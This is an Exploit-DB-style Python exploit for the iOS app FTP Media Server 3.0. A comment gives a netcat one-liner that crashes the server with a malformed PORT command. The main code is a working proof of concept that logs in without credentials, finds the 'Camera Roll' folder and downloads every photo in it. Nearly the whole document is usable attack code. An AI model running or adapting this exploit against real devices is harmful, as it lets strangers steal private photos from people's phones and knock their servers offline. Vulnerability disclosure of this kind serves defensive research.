#!/usr/bin/env python3
#==================================================================================
# Exploit Title: FTP Media Server 3.0 - Authentication Bypass and Denial of Service
# Date: 2015-05-25
# Exploit Author: Wh1t3Rh1n0 (Michael Allen) + CHATGPT
# Software Link: https://itunes.apple.com/us/app/ftp-media-server-free/id528962302
# Version: 3.0

#==================================================================================
# ------------------
# Denial of Service:
# ------------------
# The FTP server does not properly handle errors raised by invalid 
# FTP commands. The following command, which sends an invalid PORT command to 
# the FTP server, will crash the server once it is received.

# echo -en "PORT\r\n" | nc -nv 192.168.2.5 50000

# ----------------------
# Authentication Bypass:
# ----------------------
# The FTP server does not handle unauthenticated connections or incorrect login
# credentials properly. A remote user can issue commands to the FTP server 
# without authenticating or after entering incorrect credentials.

# The following proof-of-concept connects to the given FTP server and 
# downloads all files stored in the "Camera Roll" folder without providing a
# username or password:

import sys
from ftplib import FTP

if len(sys.argv) <= 1:
    print("Usage: ./ftp-nologin.py [host] [port]")
    sys.exit()

host = sys.argv[1]
port = int(sys.argv[2])

def list_dirs(ftp, dir_path):
    lines = []
    ftp.retrlines(f'LIST {dir_path}', lines.append)
    return lines

def find_directory(ftp, search_dir, target_dir):
    print(f"Searching for '{target_dir}' in '{search_dir}'")
    try:
        lines = list_dirs(ftp, search_dir)
        for line in lines:
            parts = line.split()
            name = parts[-1]
            if line.startswith('d') and name == target_dir:
                print(f"Found target directory: {search_dir}/{name}")
                return f"{search_dir}/{name}"
            elif line.startswith('d'):
                found = find_directory(ftp, f"{search_dir}/{name}", target_dir)
                if found:
                    return found
    except Exception as e:
        print(f"Error accessing directory '{search_dir}': {e}")
    return None

def download_files(ftp, dir_path):
    files = []
    ftp.retrlines(f'LIST {dir_path}', lambda x: files.append(x.split()[-1]))
    
    for filename in files:
        print(f"Downloading {filename} from {dir_path}...")
        local_filename = filename
        with open(local_filename, 'wb') as f:
            ftp.retrbinary(f'RETR {dir_path}/{filename}', f.write)
        print(f"[+] File saved to: {local_filename}")

ftp = FTP()
print(ftp.connect(host, port))
ftp.login()  # Attempt anonymous login
ftp.set_pasv(1)

# Start searching from the root directory
target_directory = "Camera Roll"
found_dir = find_directory(ftp, "/", target_directory)

if found_dir:
    download_files(ftp, found_dir)
else:
    print(f"Directory '{target_directory}' not found")

ftp.quit()
